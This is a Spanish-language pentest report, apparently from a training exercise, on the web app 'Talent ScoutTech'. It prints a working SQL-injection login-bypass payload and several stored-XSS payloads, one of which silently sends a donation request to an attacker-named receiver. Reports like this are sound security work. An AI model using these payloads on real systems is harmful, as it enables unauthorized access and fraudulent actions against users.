# Informe de Pentesting

## Introducción

Este informe detalla los resultados de un pentesting realizado sobre la aplicación web **Talent ScoutTech**. Durante las pruebas se identificaron vulnerabilidades críticas, específicamente relacionadas con **inyección SQL (SQLi)** y **cross-site scripting (XSS)**, las cuales podrían comprometer la confidencialidad, integridad y disponibilidad de la aplicación. En este documento se describen las vulnerabilidades detectadas, los métodos utilizados para explotarlas, y ejemplos prácticos de los posibles impactos.

---

## Vulnerabilidades Detectadas

### 1. Inyección SQL (SQLi)

#### Descripción
En el formulario de inicio de sesión de la página `list_players.php`, se detectó una vulnerabilidad de inyección SQL en el campo `User`. La consulta SQL generada es susceptible de ser manipulada por un atacante para acceder a datos sensibles o autenticarse como un usuario válido sin conocer la contraseña.

#### Ejemplo de Explotación
1. **Paso 1:** Introducir el carácter `"`.
   - **Resultado:** La aplicación muestra un error que evidencia la vulnerabilidad:
     ![Imagen 1](/img/1.png)

   - Mensaje de error devuelto tras pulsar en "Login":
     ![Imagen 2](/img/2.png)

2. **Consulta Vulnerable:**
   ```php
   SELECT userId, password FROM users WHERE username = 'user_input' AND password = 'password_input'
   ```

3. **Ataque de Diccionario:**
   Para explotar la vulnerabilidad, se utilizó el siguiente payload en el campo `User`:
   ```
   " OR password="1234" --
   ```

   - **Resultado:** Autenticación exitosa con una contraseña válida encontrada en un diccionario.
     ![Imagen 3](/img/3.png)

4. **Identificación del Usuario:**
   Para conocer el nombre del usuario autenticado, se introdujo un comentario en uno de los jugadores. Al visualizar el comentario, se pudo determinar el nombre del usuario autenticado:
   - Comentarios antes del ataque:

     ![Imagen 6](/img/6.png)

   - Nuevo comentario:

     ![Imagen 7](/img/7.png)

   - Comentarios actualizados:
   
     ![Imagen 8](/img/8.png)

   - **Nombre del usuario identificado:** `luis`.

---

### 2. Cross-Site Scripting (XSS)

#### Descripción
Se identificaron múltiples puntos en la aplicación web donde es posible inyectar código JavaScript malicioso que se ejecuta al ser visualizado por otros usuarios. Esto permite ataques como robo de cookies, redirección a sitios maliciosos y ejecución de scripts en segundo plano.

#### 2.1. XSS en `add_comment.php`

1. **Payload Utilizado:**
   ```html
   <script>alert('¡Vulnerabilidad XSS!');</script>
   ```

2. **Explotación:**
   - Payload inyectado en el campo de comentarios:

     ![Imagen 9](/img/9.png)

   - Al visualizar el comentario, se ejecuta el código malicioso:

     ![Imagen 10](/img/10.png)

   - **Resultado:** Se muestra una alerta en el navegador:
   
     ![Imagen 11](/img/11.png)

#### 2.2. XSS en `insert_player.php`

1. **Vulnerabilidad en el campo `team`:**
   - Captura previa a la inyección:

     ![Imagen 13](/img/13.png)

2. **Payload Utilizado:**
   ```html
   <br><br><br>
   <a href="http://web.pagos/donate.php?amount=100&receiver=attacker">Profile</a>
   ```

3. **Explotación:**
   - Al enviar el formulario, el botón se renderiza en la página:

     ![Imagen 15](/img/15.png)

#### 2.3. XSS en `buscador.html`

1. **Descripción:**
   Se utilizó un payload para realizar una donación automática en segundo plano sin la intervención del usuario.

2. **Payload Utilizado:**
   ```html
   <script>
     var xhr = new XMLHttpRequest();
     xhr.open("GET", "http://web.pagos/donate.php?amount=100&receiver=attacker", true);
     xhr.send();
   </script>
   ```

3. **Explotación:**
   - Payload insertado en un comentario:

     ![Imagen 16](/img/16.png)

   - **Resultado:** El script se ejecuta automáticamente al cargar los comentarios, iniciando una solicitud HTTP en segundo plano:
     ![Imagen 17](/img/17.png)

---

## Conclusión

El análisis evidenció múltiples vulnerabilidades críticas que podrían comprometer la seguridad de la aplicación **Web_Talent-ScoutTech**. Las vulnerabilidades de inyección SQL y XSS nos permiten obtener acceso no autorizado, ejecutar scripts maliciosos, y potencialmente manipular los datos sensibles de los usuarios.